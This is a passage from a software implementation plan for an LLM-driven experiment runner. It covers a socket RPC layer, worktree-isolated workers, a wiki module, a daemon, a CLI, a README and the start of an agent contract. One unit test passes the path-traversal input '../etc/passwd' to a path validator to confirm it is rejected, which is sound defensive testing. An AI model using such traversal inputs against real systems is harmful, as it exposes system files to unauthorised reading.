    os.chmod(sock_path, 0o600)
    srv.listen(64)
    srv.settimeout(0.25)

    try:
        while not stop.is_set():
            try:
                conn, _ = srv.accept()
            except socket.timeout:
                continue
            with conn:
                try:
                    data = _recv(conn)
                    req = schema.decode(data, schema.Req)
                    if req.type == "__quit__":
                        _send(conn, schema.encode(schema.Resp(ok=True)))
                        break
                    try:
                        resp = handler(req)
                    except Exception as e:
                        resp = schema.Resp(ok=False, error=str(e))
                    _send(conn, schema.encode(resp))
                except Exception:
                    pass
    finally:
        srv.close()
        try:
            sock_path.unlink()
        except FileNotFoundError:
            pass


def call(sock_path: Path, req: schema.Req, *, timeout: float = 5.0) -> schema.Resp:
    sock_path = Path(sock_path)
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        try:
            s.connect(str(sock_path))
        except (FileNotFoundError, ConnectionRefusedError) as e:
            raise ConnectionError(f"cannot reach {sock_path}: {e}")
        _send(s, schema.encode(req))
        data = _recv(s)
        return schema.decode(data, schema.Resp)
    finally:
        s.close()
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/rpc.py tests/test_rpc.py
git commit -m "feat: rpc — uds server/client with length-prefixed msgpack"
```

---

## Task 10: worker.py — worktree + subprocess + metric extraction

**Files:**
- Create: `src/new/worker.py`, `tests/test_worker.py`

- [ ] **Step 1: Tests**

```python
import os
import subprocess
from pathlib import Path

import pytest

from new import worker


@pytest.fixture
def mini_repo(tmp_path):
    subprocess.check_call(["git", "init", "-q", "-b", "master"], cwd=tmp_path)
    subprocess.check_call(["git", "config", "user.email", "x@y"], cwd=tmp_path)
    subprocess.check_call(["git", "config", "user.name", "x"], cwd=tmp_path)
    (tmp_path / "run.py").write_text(
        "import sys; print('val_loss:', 0.42); sys.exit(0)\n"
    )
    subprocess.check_call(["git", "add", "."], cwd=tmp_path)
    subprocess.check_call(["git", "commit", "-q", "-m", "init"], cwd=tmp_path)
    return tmp_path


def test_run_extracts_metric(mini_repo):
    r = worker.run_one(
        project=mini_repo,
        exp_num=1,
        run_command=["python", "run.py"],
        grep_pattern=r"^val_loss:",
        timeout_s=15,
    )
    assert r["status"] == "ok"
    assert abs(r["metric"] - 0.42) < 1e-9
    assert Path(r["log_path"]).exists()


def test_run_crash_no_metric(mini_repo):
    (mini_repo / "crash.py").write_text("import sys; sys.exit(1)\n")
    subprocess.check_call(["git", "add", "."], cwd=mini_repo)
    subprocess.check_call(["git", "commit", "-q", "-m", "crash"], cwd=mini_repo)
    r = worker.run_one(
        project=mini_repo, exp_num=2,
        run_command=["python", "crash.py"],
        grep_pattern=r"^val_loss:", timeout_s=15,
    )
    assert r["status"] == "crash"
    assert r["metric"] is None


def test_timeout_kills(mini_repo):
    (mini_repo / "slow.py").write_text("import time; time.sleep(60)\n")
    subprocess.check_call(["git", "add", "."], cwd=mini_repo)
    subprocess.check_call(["git", "commit", "-q", "-m", "slow"], cwd=mini_repo)
    r = worker.run_one(
        project=mini_repo, exp_num=3,
        run_command=["python", "slow.py"],
        grep_pattern=r"^val_loss:", timeout_s=1,
    )
    assert r["status"] == "timeout"


def test_worktree_cleaned_up(mini_repo):
    r = worker.run_one(
        project=mini_repo, exp_num=4,
        run_command=["python", "run.py"],
        grep_pattern=r"^val_loss:", timeout_s=10,
    )
    # worktree path should no longer be in 'git worktree list'
    out = subprocess.check_output(["git", "worktree", "list"], cwd=mini_repo).decode()
    assert str(mini_repo / ".new" / "worktrees") not in out
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/worker.py`**

```python
import os
import shlex
import shutil
import signal
import subprocess
import time
from pathlib import Path

from . import metric


def _run_git(args: list[str], cwd: Path) -> str:
    out = subprocess.check_output(["git", *args], cwd=cwd, text=True, stderr=subprocess.PIPE)
    return out.strip()


def run_one(*, project: Path, exp_num: int,
            run_command: list[str], grep_pattern: str,
            timeout_s: int) -> dict:
    project = Path(project)
    logs_dir = project / ".new" / "logs"
    logs_dir.mkdir(parents=True, exist_ok=True)
    sha = _run_git(["rev-parse", "HEAD"], project)[:7]
    wt = project / ".new" / "worktrees" / f"{exp_num:04d}-{sha}"
    wt.parent.mkdir(parents=True, exist_ok=True)
    log_path = logs_dir / f"{exp_num:04d}_{sha}.log"

    started = time.time()
    _run_git(["worktree", "add", "-q", "--detach", str(wt), sha], project)

    try:
        with open(log_path, "wb") as lf:
            try:
                proc = subprocess.Popen(
                    run_command, cwd=wt, stdout=lf, stderr=subprocess.STDOUT,
                    start_new_session=True,   # own process group for kill
                )
            except FileNotFoundError as e:
                return {
                    "status": "crash", "metric": None, "log_path": str(log_path),
                    "sha": sha, "duration_s": time.time() - started, "err": str(e),
                }
            try:
                rc = proc.wait(timeout=timeout_s)
                status = "ok" if rc == 0 else "crash"
            except subprocess.TimeoutExpired:
                try:
                    os.killpg(proc.pid, signal.SIGTERM)
                    proc.wait(timeout=5)
                except Exception:
                    try:
                        os.killpg(proc.pid, signal.SIGKILL)
                    except Exception:
                        pass
                status = "timeout"
                rc = -1

        log_text = log_path.read_text(errors="replace")
        m = metric.parse(log_text, grep_pattern)
        if status == "ok" and m is None:
            status = "crash"

        return {
            "status": status, "metric": m, "log_path": str(log_path),
            "sha": sha, "duration_s": time.time() - started, "rc": rc,
        }
    finally:
        try:
            _run_git(["worktree", "remove", "--force", str(wt)], project)
        except Exception:
            shutil.rmtree(wt, ignore_errors=True)
            try:
                _run_git(["worktree", "prune"], project)
            except Exception:
                pass
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/worker.py tests/test_worker.py
git commit -m "feat: worker — worktree-isolated run with timeout and metric extraction"
```

---

## Task 11: wiki.py — palace layout + path safety + index/log

**Files:**
- Create: `src/new/wiki.py`, `tests/test_wiki.py`

- [ ] **Step 1: Tests**

```python
import pytest

from new import wiki


def test_init_creates_skeleton(tmp_project):
    wiki.init(tmp_project / "wiki")
    root = tmp_project / "wiki"
    for name in ["index.md", "log.md", "schema.md"]:
        assert (root / name).exists()
    for d in ["theses", "topics", "experiments"]:
        assert (root / d).is_dir()


def test_safe_path_inside(tmp_project):
    wiki.init(tmp_project / "wiki")
    p = wiki.safe_page_path(tmp_project / "wiki", "topics/learning-rate.md")
    assert p.parent.name == "topics"


def test_safe_path_rejects_traversal(tmp_project):
    wiki.init(tmp_project / "wiki")
    with pytest.raises(ValueError):
        wiki.safe_page_path(tmp_project / "wiki", "../etc/passwd")


def test_safe_path_rejects_absolute(tmp_project):
    wiki.init(tmp_project / "wiki")
    with pytest.raises(ValueError):
        wiki.safe_page_path(tmp_project / "wiki", "/tmp/bad")


def test_append_log_line(tmp_project):
    wiki.init(tmp_project / "wiki")
    wiki.append_log(tmp_project / "wiki", "ingest", "added page foo")
    text = (tmp_project / "wiki" / "log.md").read_text()
    assert "ingest" in text and "added page foo" in text


def test_rebuild_index(tmp_project):
    root = tmp_project / "wiki"
    wiki.init(root)
    (root / "topics" / "learning-rate.md").write_text(
        "# learning rate\nsome content\n"
    )
    (root / "experiments" / "0001-foo.md").write_text("# exp 1\n")
    wiki.rebuild_index(root)
    idx = (root / "index.md").read_text()
    assert "topics/learning-rate.md" in idx
    assert "experiments/0001-foo.md" in idx
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/wiki.py`**

```python
import time
from pathlib import Path


_SUBDIRS = ("theses", "topics", "experiments")


def init(root: Path) -> None:
    root = Path(root)
    root.mkdir(parents=True, exist_ok=True)
    for d in _SUBDIRS:
        (root / d).mkdir(exist_ok=True)
    _ensure(root / "index.md", "# index\n\n(empty — run `new lint` to rebuild)\n")
    _ensure(root / "log.md", "# log\n\n")
    _ensure(root / "schema.md", _SCHEMA_DOC)


def _ensure(p: Path, content: str) -> None:
    if not p.exists():
        p.write_text(content)


_SCHEMA_DOC = """# palace schema

three layers:

- `theses/` — wings. high-level claims we're converging on.
- `topics/` — rooms. thematic clusters of experiments.
- `experiments/` — drawers. one page per run, verbatim.

`index.md` — catalog. regenerated by `new lint`.
`log.md`   — append-only event log. one line per event.
"""


def safe_page_path(root: Path, rel: str) -> Path:
    root = Path(root).resolve()
    if rel.startswith("/") or ".." in Path(rel).parts:
        raise ValueError(f"unsafe wiki path: {rel}")
    p = (root / rel).resolve()
    if not str(p).startswith(str(root) + "/"):
        raise ValueError(f"escape detected: {rel}")
    return p


def append_log(root: Path, kind: str, msg: str) -> None:
    log = Path(root) / "log.md"
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(log, "a") as f:
        f.write(f"- {ts} {kind}: {msg}\n")


def rebuild_index(root: Path) -> None:
    root = Path(root)
    lines = ["# index", ""]
    for sub in _SUBDIRS:
        lines.append(f"## {sub}")
        pages = sorted((root / sub).glob("*.md"))
        if not pages:
            lines.append("_(empty)_")
        for p in pages:
            title = _first_heading(p) or p.stem
            lines.append(f"- [{title}]({sub}/{p.name})")
        lines.append("")
    (root / "index.md").write_text("\n".join(lines))


def _first_heading(p: Path) -> str | None:
    for line in p.read_text().splitlines():
        line = line.strip()
        if line.startswith("#"):
            return line.lstrip("#").strip()
    return None
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/wiki.py tests/test_wiki.py
git commit -m "feat: wiki — palace layout, path safety, index rebuild, append log"
```

---

## Task 12: consolidate.py — trigger logic + prompt emission

**Files:**
- Create: `src/new/consolidate.py`, `tests/test_consolidate.py`

- [ ] **Step 1: Tests**

```python
from new import consolidate, metric, store


def _insert_runs(s, metrics, status="keep"):
    for i, m in enumerate(metrics, start=1):
        s.insert_run(
            exp_num=i, commit_sha="x", metric=m, metric_holdout=None,
            status=status, duration_s=0.0, started_at=float(i),
            ended_at=float(i), hypothesis="", verdict="",
            description="", log_path="", wiki_refs=[],
        )


def test_trigger_by_count(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    _insert_runs(s, [0.1] * 20)
    assert consolidate.should_fire(s, every=20, thresh=0.01)[0] == "count"


def test_trigger_by_stall_discards(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    _insert_runs(s, [0.1] * 5, status="discard")
    assert consolidate.should_fire(s, every=50, thresh=0.01)[0] == "stall"


def test_trigger_by_flat_metric(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    # 10 runs all at same metric = stddev 0 < 0.01 * 0.1
    _insert_runs(s, [0.5] * 10)
    assert consolidate.should_fire(s, every=50, thresh=0.01)[0] == "stall"


def test_no_trigger_when_healthy(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    _insert_runs(s, [0.5, 0.4, 0.3, 0.25, 0.2])   # progressive improvement
    assert consolidate.should_fire(s, every=50, thresh=0.01) is None


def test_prompt_includes_recent(tmp_project):
    s = store.open_store(tmp_project / ".new" / "state.db")
    _insert_runs(s, [0.9, 0.8, 0.7])
    prompt = consolidate.build_prompt(s, wiki_root=tmp_project / "wiki",
                                       reason="manual")
    assert "recent runs" in prompt.lower()
    assert "0.9" in prompt or "0.8" in prompt or "0.7" in prompt
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/consolidate.py`**

```python
from pathlib import Path

from . import metric


def should_fire(s, *, every: int, thresh: float) -> tuple[str, str] | None:
    n = s.runs_since_last_consolidation()
    if n >= every:
        return ("count", f"{n} runs since last consolidation")
    last = s.last_runs(10)
    if not last:
        return None
    # stall by consecutive discards
    discards = 0
    for r in last:
        if r["status"] == "discard":
            discards += 1
        else:
            break
    if discards >= 5:
        return ("stall", f"{discards} consecutive discards")
    # stall by flat metric
    ms = [r["metric"] for r in last if r["metric"] is not None]
    if len(ms) >= 10:
        _, sd = metric.stats(ms)
        if sd < thresh * 0.1:
            return ("stall", f"metric stddev {sd:.4f} < {thresh * 0.1:.4f}")
    return None


def build_prompt(s, *, wiki_root: Path, reason: str) -> str:
    last = s.last_runs(10)
    lines = [
        "# consolidation pass",
        f"reason: {reason}",
        "",
        "## recent runs (most recent first)",
        "",
    ]
    for r in last:
        m = "-" if r["metric"] is None else f"{r['metric']:.4f}"
        lines.append(
            f"- exp {r['exp_num']:04d} [{r['status']}] metric={m} "
            f"— {r['description']}"
        )
    lines += [
        "",
        "## what to do",
        "1. read the wiki (theses/, topics/, experiments/).",
        "2. for each recent run, ensure an experiments/<N>-<slug>.md page exists",
        "   with hypothesis, verdict, metric.",
        "3. update affected topic pages (synthesis across experiments).",
        "4. if a thesis is supported or contradicted by the recent evidence,",
        "   update its status.",
        "5. flag any contradiction between a newer run and an older claim.",
        "6. commit. run `new consolidate --done --notes \"...\"`.",
        "",
        f"wiki root: {wiki_root}",
    ]
    return "\n".join(lines)
```

- [ ] **Step 4: Run — PASS**

- [ ] **Step 5: Commit**

```bash
git add src/new/consolidate.py tests/test_consolidate.py
git commit -m "feat: consolidate — two-gear trigger + prompt builder"
```

---

## Task 13: daemon.py — supervisor, pool, main loop

**Files:**
- Create: `src/new/daemon.py`

This task has no tests of its own — the daemon is exercised in `test_e2e.py` (Task 18). The contract is:

- `main()` is the entrypoint (called by `newd` script).
- Writes a pidfile at `.new/newd.pid`, unlinks on shutdown.
- Serves RPC on `.new/sock`.
- Workers run in a thread pool of size `cfg.workers`.
- Main loop: claim queue item → `worker.run_one` → `store.insert_run` → budget update → sleep.
- On SIGTERM: set stop flag, wait for in-flight workers (up to 15s), close socket, exit.

- [ ] **Step 1: Write `src/new/daemon.py`**

```python
import argparse
import concurrent.futures
import json
import os
import signal
import sys
import threading
import time
from pathlib import Path

import yaml

from . import budget, consolidate, rpc, schema, store, util, wiki, worker


def _load_cfg(project: Path) -> schema.Config:
    text = (project / "experiment.yaml").read_text()
    return schema.load_config_yaml(text)


class Daemon:
    def __init__(self, project: Path):
        self.project = Path(project)
        self.cfg = _load_cfg(self.project)
        self.store = store.open_store(self.project / ".new" / "state.db")
        self.stop = threading.Event()
        self.in_flight = 0
        self.in_flight_lock = threading.Lock()
        self.pool = concurrent.futures.ThreadPoolExecutor(
            max_workers=max(1, self.cfg.workers)
        )
        budget.init(
            self.store,
            experiments=self.cfg.budget.max_experiments,
            wallclock_h=self.cfg.budget.max_wallclock_hours,
            cost_usd=self.cfg.budget.max_cost_usd,
        )
        self.started_at = time.time()
        wiki.init(self.project / "wiki")

    # ---------- RPC ----------

    def handle(self, req: schema.Req) -> schema.Resp:
        try:
            data = json.loads(req.payload or b"{}")
        except Exception:
            data = {}
        if req.type == "status":
            return schema.Resp(ok=True, payload=self._status())
        if req.type == "run":
            return self._enqueue(data)
        if req.type == "consolidate":
            return self._consolidate(data)
        if req.type == "lint":
            wiki.rebuild_index(self.project / "wiki")
            return schema.Resp(ok=True, payload=b"{}")
        if req.type == "health":
            return schema.Resp(ok=True, payload=b"{}")
        if req.type == "down":
            self.stop.set()
            return schema.Resp(ok=True, payload=b"{}")
        return schema.Resp(ok=False, error=f"unknown rpc type: {req.type}")

    def _status(self) -> bytes:
        st = budget.state(self.store)
        last = self.store.last_runs(5)
        return json.dumps({
            "daemon_up": True,
            "queue_size": self.store.queue_size(),
            "in_flight": self.in_flight,
            "budget_used": st["used"],
            "budget_cap": st["caps"],
            "last_runs": last,
            "halted_reason": budget.halt_reason(self.store),
            "uptime_s": time.time() - self.started_at,
        }).encode()

    def _enqueue(self, data: dict) -> schema.Resp:
        hyp = data.get("hypothesis", "")
        desc = data.get("description", "")
        pri = int(data.get("priority", 0))
        qid = self.store.enqueue(json.dumps(
            {"hypothesis": hyp, "description": desc}
        ), priority=pri)
        return schema.Resp(ok=True, payload=json.dumps({"queue_id": qid}).encode())

    def _consolidate(self, data: dict) -> schema.Resp:
        if data.get("done"):
            self.store.record_consolidation_end(
                pages_touched=int(data.get("pages_touched", 0)),
                notes=data.get("notes", ""),
            )
            wiki.append_log(self.project / "wiki", "consolidate",
                            f"done: {data.get('notes', '')[:80]}")
            return schema.Resp(ok=True, payload=b"{}")
        reason = data.get("reason", "manual")
        self.store.record_consolidation_start(reason)
        prompt = consolidate.build_prompt(
            self.store, wiki_root=self.project / "wiki", reason=reason,
        )
        return schema.Resp(ok=True, payload=prompt.encode())

    # ---------- main loop ----------

    def loop(self) -> None:
        # wallclock ticker
        tick_thread = threading.Thread(target=self._wallclock_tick, daemon=True)
        tick_thread.start()

        futures = []
        while not self.stop.is_set():
            if budget.halt_reason(self.store):
                time.sleep(0.5)
                continue
            if self.store.kv_get("consolidating") == "1":
                time.sleep(0.25)
                continue
            item = self.store.claim_one(worker=f"pool-{os.getpid()}")
            if item is None:
                self._maybe_trigger_consolidation()
                time.sleep(0.25)
                continue
            if not budget.try_consume(self.store, "experiments", 1):
                self.store.dequeue(item["id"])
                continue
            futures = [f for f in futures if not f.done()]
            fut = self.pool.submit(self._run_worker, item)
            futures.append(fut)

        # shutdown
        for f in futures:
            try:
                f.result(timeout=15)
            except Exception:
                pass

    def _run_worker(self, item: dict) -> None:
        with self.in_flight_lock:
            self.in_flight += 1
        try:
            exp_num = self.store.next_exp_num()
            spec = json.loads(item["spec"])
            started = time.time()
            r = worker.run_one(
                project=self.project,
                exp_num=exp_num,
                run_command=self.cfg.run_command,
                grep_pattern=self.cfg.grep_pattern,
                timeout_s=self.cfg.timeout_seconds,
            )
            ended = time.time()
            status = "keep" if r["status"] == "ok" and r["metric"] is not None else (
                "crash" if r["status"] in ("crash", "timeout") else "skip"
            )
            self.store.insert_run(
                exp_num=exp_num, commit_sha=r["sha"],
                metric=r["metric"], metric_holdout=None,
                status=status, duration_s=r["duration_s"],
                started_at=started, ended_at=ended,
                hypothesis=spec.get("hypothesis", ""),
                verdict="",
                description=spec.get("description", ""),
                log_path=r["log_path"], wiki_refs=[],
            )
            self.store.dequeue(item["id"])
        finally:
            with self.in_flight_lock:
                self.in_flight -= 1

    def _maybe_trigger_consolidation(self) -> None:
        fire = consolidate.should_fire(
            self.store,
            every=self.cfg.consolidate_every,
            thresh=self.cfg.improvement_threshold,
        )
        if fire and self.store.kv_get("consolidating") != "1":
            kind, why = fire
            self.store.kv_set("consolidating", "1")
            wiki.append_log(self.project / "wiki", "consolidate",
                            f"pending: {kind} ({why})")

    def _wallclock_tick(self) -> None:
        last = time.time()
        while not self.stop.is_set():
            time.sleep(1.0)
            now = time.time()
            budget.try_consume(self.store, "wallclock", now - last)
            last = now

    # ---------- lifecycle ----------

    def close(self) -> None:
        self.pool.shutdown(wait=False)
        self.store.close()


def main():
    ap = argparse.ArgumentParser(prog="newd")
    ap.add_argument("--project", default=".", help="project dir (default: cwd)")
    ap.add_argument("--foreground", action="store_true")
    args = ap.parse_args()

    project = Path(args.project).resolve()
    os.environ["NEW_PROJECT_ROOT"] = str(project)
    pf = project / ".new" / "newd.pid"
    pf.parent.mkdir(parents=True, exist_ok=True)

    old = util.read_pidfile(pf)
    if util.pid_alive(old):
        print(f"newd already running (pid {old})", file=sys.stderr)
        sys.exit(1)
    util.write_pidfile(pf, os.getpid())

    d = Daemon(project)

    def _sig(_s, _f):
        d.stop.set()
    signal.signal(signal.SIGTERM, _sig)
    signal.signal(signal.SIGINT, _sig)

    server_stop = threading.Event()
    server_thread = threading.Thread(
        target=rpc.serve,
        args=(project / ".new" / "sock", d.handle, server_stop),
        daemon=True,
    )
    server_thread.start()

    try:
        d.loop()
    finally:
        server_stop.set()
        try:
            rpc.call(project / ".new" / "sock", schema.Req(type="__quit__"),
                     timeout=1.0)
        except Exception:
            pass
        server_thread.join(timeout=2.0)
        d.close()
        try:
            pf.unlink()
        except FileNotFoundError:
            pass


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Sanity check the import**

```bash
uv run python -c "from new import daemon; print('ok')"
```
Expected: `ok`.

- [ ] **Step 3: Commit**

```bash
git add src/new/daemon.py
git commit -m "feat: daemon — supervisor, worker pool, main loop, rpc dispatch"
```

---

## Task 14: cli.py — verbs and process management

**Files:**
- Create: `src/new/cli.py`, `src/new/__main__.py`, `tests/test_cli.py`

- [ ] **Step 1: Tests**

```python
import json
import subprocess
import sys
import time
from pathlib import Path


def test_init_scaffolds(tmp_project):
    p = subprocess.run(
        [sys.executable, "-m", "new", "init"],
        cwd=tmp_project, capture_output=True, text=True,
    )
    assert p.returncode == 0, p.stderr
    assert (tmp_project / "experiment.yaml").exists()
    assert (tmp_project / "wiki" / "index.md").exists()


def test_status_when_no_daemon(tmp_project):
    p = subprocess.run(
        [sys.executable, "-m", "new", "status"],
        cwd=tmp_project, capture_output=True, text=True,
    )
    assert p.returncode == 0
    assert "down" in p.stdout.lower() or "not running" in p.stdout.lower()
```

- [ ] **Step 2: Run — FAIL**

- [ ] **Step 3: Implement `src/new/__main__.py`**

```python
from .cli import main

main()
```

- [ ] **Step 4: Implement `src/new/cli.py`**

```python
import argparse
import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path

from . import rpc, schema, util, wiki


_TEMPLATE_YAML = """\
run_command: python train.py
grep_pattern: "^val_loss:"
metric:
  name: val_loss
  direction: minimize
workers: 1
consolidate_every: 20
improvement_threshold: 0.005
timeout_seconds: 600
budget:
  max_experiments: 500
  max_wallclock_hours: 8
  max_cost_usd: 0
"""


def _project() -> Path:
    return Path(os.environ.get("NEW_PROJECT_ROOT", os.getcwd())).resolve()


def _sock() -> Path:
    return _project() / ".new" / "sock"


def _pid() -> Path:
    return _project() / ".new" / "newd.pid"


def _daemon_up() -> bool:
    pid = util.read_pidfile(_pid())
    return util.pid_alive(pid) and _sock().exists()


def cmd_init(args):
    proj = _project()
    (proj / ".new").mkdir(exist_ok=True)
    yf = proj / "experiment.yaml"
    if not yf.exists():
        yf.write_text(_TEMPLATE_YAML)
    wiki.init(proj / "wiki")
    # seed git if not already
    if not (proj / ".git").exists():
        subprocess.run(["git", "init", "-q", "-b", "master"], cwd=proj, check=False)
    print(f"initialized {proj}")


def cmd_up(args):
    if _daemon_up():
        print("newd already up")
        return
    proj = _project()
    log = proj / ".new" / "logs" / "newd.log"
    log.parent.mkdir(parents=True, exist_ok=True)
    # spawn detached
    p = subprocess.Popen(
        [sys.executable, "-m", "new.daemon", "--project", str(proj)],
        stdout=open(log, "ab"), stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    # wait up to 3s for socket
    for _ in range(60):
        if _sock().exists():
            print(f"newd up (pid {p.pid})")
            return
        time.sleep(0.05)
    print("newd did not come up — see .new/logs/newd.log", file=sys.stderr)
    sys.exit(1)


def cmd_down(args):
    pid = util.read_pidfile(_pid())
    if not util.pid_alive(pid):
        print("newd not running")
        return
    try:
        os.kill(pid, signal.SIGTERM)
    except Exception as e:
        print(f"signal error: {e}", file=sys.stderr)
        sys.exit(1)
    for _ in range(100):
        if not util.pid_alive(pid):
            print("stopped")
            return
        time.sleep(0.1)
    try:
        os.kill(pid, signal.SIGKILL)
    except Exception:
        pass
    print("killed")


def cmd_status(args):
    if not _daemon_up():
        print("newd: down")
        return
    resp = rpc.call(_sock(), schema.Req(type="status"))
    if not resp.ok:
        print(f"error: {resp.error}", file=sys.stderr)
        sys.exit(1)
    data = json.loads(resp.payload)
    print(f"newd: up (uptime {data['uptime_s']:.0f}s)")
    print(f"queue: {data['queue_size']}  in-flight: {data['in_flight']}")
    print("budget:")
    for k in data["budget_cap"]:
        cap = data["budget_cap"][k]
        used = data["budget_used"].get(k, 0)
        cap_s = "disabled" if cap <= 0 else f"{cap:.2f}"
        print(f"  {k}: {used:.2f} / {cap_s}")
    if data.get("halted_reason"):
        print(f"halted: {data['halted_reason']}")
    print("last runs:")
    for r in data.get("last_runs", []):
        m = "-" if r["metric"] is None else f"{r['metric']:.4f}"
        print(f"  {r['exp_num']:04d} [{r['status']:7}] {m}  {r['description']}")


def cmd_run(args):
    if not _daemon_up():
        print("newd not running; run `new up`", file=sys.stderr)
        sys.exit(1)
    payload = json.dumps({
        "hypothesis": args.hypothesis or "",
        "description": args.description or "",
        "priority": args.priority,
    }).encode()
    resp = rpc.call(_sock(), schema.Req(type="run", payload=payload))
    if not resp.ok:
        print(f"error: {resp.error}", file=sys.stderr)
        sys.exit(1)
    print(resp.payload.decode())


def cmd_consolidate(args):
    if not _daemon_up():
        print("newd not running", file=sys.stderr)
        sys.exit(1)
    if args.done:
        payload = json.dumps({
            "done": True, "notes": args.notes or "",
            "pages_touched": args.pages_touched,
        }).encode()
    else:
        payload = json.dumps({"reason": "manual" if args.force else "auto"}).encode()
    resp = rpc.call(_sock(), schema.Req(type="consolidate", payload=payload))
    if not resp.ok:
        print(f"error: {resp.error}", file=sys.stderr)
        sys.exit(1)
    print(resp.payload.decode())


def cmd_lint(args):
    if not _daemon_up():
        wiki.rebuild_index(_project() / "wiki")
        print("wiki/index.md rebuilt (offline)")
        return
    rpc.call(_sock(), schema.Req(type="lint"))
    print("wiki/index.md rebuilt")


def cmd_logs(args):
    logs = _project() / ".new" / "logs"
    if args.exp is not None:
        matches = sorted(logs.glob(f"{args.exp:04d}_*.log"))
        if not matches:
            print(f"no log for exp {args.exp}", file=sys.stderr)
            sys.exit(1)
        print(matches[-1].read_text())
        return
    newd = logs / "newd.log"
    if not newd.exists():
        print("no daemon log yet", file=sys.stderr)
        return
    if args.follow:
        subprocess.call(["tail", "-F", str(newd)])
    else:
        print(newd.read_text())


def main():
    ap = argparse.ArgumentParser(prog="new")
    sub = ap.add_subparsers(dest="cmd", required=True)

    sub.add_parser("init").set_defaults(fn=cmd_init)
    sub.add_parser("up").set_defaults(fn=cmd_up)
    sub.add_parser("down").set_defaults(fn=cmd_down)
    sub.add_parser("status").set_defaults(fn=cmd_status)

    r = sub.add_parser("run")
    r.add_argument("--hypothesis", "-H", default="")   # -h is argparse's help
    r.add_argument("--description", "-d", default="")
    r.add_argument("--priority", "-p", type=int, default=0)
    r.set_defaults(fn=cmd_run)

    c = sub.add_parser("consolidate")
    c.add_argument("--force", action="store_true")
    c.add_argument("--done", action="store_true")
    c.add_argument("--notes", default="")
    c.add_argument("--pages-touched", type=int, default=0)
    c.set_defaults(fn=cmd_consolidate)

    sub.add_parser("lint").set_defaults(fn=cmd_lint)

    l = sub.add_parser("logs")
    l.add_argument("--exp", type=int)
    l.add_argument("--follow", "-f", action="store_true")
    l.set_defaults(fn=cmd_logs)

    args = ap.parse_args()
    args.fn(args)


if __name__ == "__main__":
    main()
```

- [ ] **Step 5: Run tests — PASS**

```bash
uv run pytest tests/test_cli.py -v
```

- [ ] **Step 6: Commit**

```bash
git add src/new/cli.py src/new/__main__.py tests/test_cli.py
git commit -m "feat: cli — init/up/down/status/run/consolidate/lint/logs"
```

---

## Task 15: README.md — personal voice

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Replace the stub `README.md` with the real one**

```markdown
# new123

Working name. Real name pending.

An autonomous experiment runner that actually remembers what it tried.

The tool sits in your project. You write a script that prints a number.
You give it a budget. An LLM agent takes over. It proposes a change, the
runner runs it in a throwaway git worktree, records the result, and — every
so often — stops to update a small wiki of what we now believe about the
problem. When the budget's up, you have code that's better than where you
started and a wiki that tells you why.

## Why this exists

I've been using karpathy's autoresearch and a fork of it called ACE for a
few months. Both work. Both hit the same wall: after ~40 experiments the
agent starts re-proposing things it already tried, the metric has drifted
from what I actually care about, and the log is too long to read. The
mechanical parts also have real bugs — shell injection if your yaml has
the wrong char in it, tsv corruption, no budget cap, no worktree
isolation. This is the rewrite I kept meaning to do.

## How it's different

- **Two gears.** A fast explore loop (run experiments) and a slow
  consolidate pass (update a wiki). The wiki is the agent's memory —
  it compounds. Inspired by karpathy's llm-wiki gist.
- **Palace layout.** Wiki is three directories: `theses/` for beliefs,
  `topics/` for clusters, `experiments/` for verbatim per-run pages.
  Borrowed from MemPalace.
- **Held-out eval.** Optional sidecar command the agent can't see. If
  the primary metric improves but the held-out doesn't, the run is
  discarded. Cheap Goodhart defense.
- **Daemon + client.** A long-lived `newd` owns everything that can go
  wrong (queue, budget, worktrees, metric parsing). A thin `new` CLI
  is what you type. No port conflicts — Unix socket.
- **Worktree per run.** Every experiment runs in its own `git worktree`.
  Crash safely, clean up automatically.
- **Budget caps that actually cap.** Atomic decrement in sqlite before
  a worker spawns. Parallel experiments can't both blow past the limit.
- **Baseline noise check.** Runs the baseline 3x before starting. If
  your metric is noisier than half your improvement threshold, refuses
  to start and tells you why.

## What it isn't

- Not a cloud orchestrator. Single machine.
- Not a hyperparameter search. The agent does the thinking.
- Not a metrics dashboard. `new status` in a second terminal.
- Not tied to any LLM. Works with Claude Code, Codex, plain bash scripts.
- Not for Windows. Unix sockets, flock, process groups.

## Install

```
uv tool install .
```

## Use

```
cd your-project/
new init                          # writes experiment.yaml, wiki/, .new/
# edit experiment.yaml
new up                            # start the daemon
new baseline                      # run baseline 3x, get noise profile
# open claude code (or whatever)
# prompt: "read program.md and let's start"
```

In another terminal:

```
new status                        # queue, budget, last 5 runs
new logs --exp 7                  # stdout of experiment 7
```

To stop:

```
new down
```

## Files

- `experiment.yaml` — config
- `program.md` — agent contract, short
- `wiki/` — the palace. agent-maintained.
- `.new/` — daemon state. gitignored.

## Credit

- karpathy's [autoresearch](https://github.com/karpathy/autoresearch) —
  the original loop shape.
- karpathy's [llm-wiki gist](https://gist.github.com/karpathy/442a6bf555914893e9891c11519de94f) —
  the wiki-as-compounding-memory idea.
- [MemPalace](https://github.com/MemPalace/mempalace) — the palace layout.
- ACE — the good parts of the yaml-config idea. Minus the bugs.

## License

MIT.
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: write real readme"
```

---

## Task 16: program.md — agent contract

**Files:**
- Create: `program.md`

- [ ] **Step 1: Write `program.md`**

```markdown
# agent contract

you drive the loop. the daemon runs experiments, tracks budget, and
maintains a wiki with you.

## setup

1. `new status` — is the daemon up?
2. if not: `new up`.
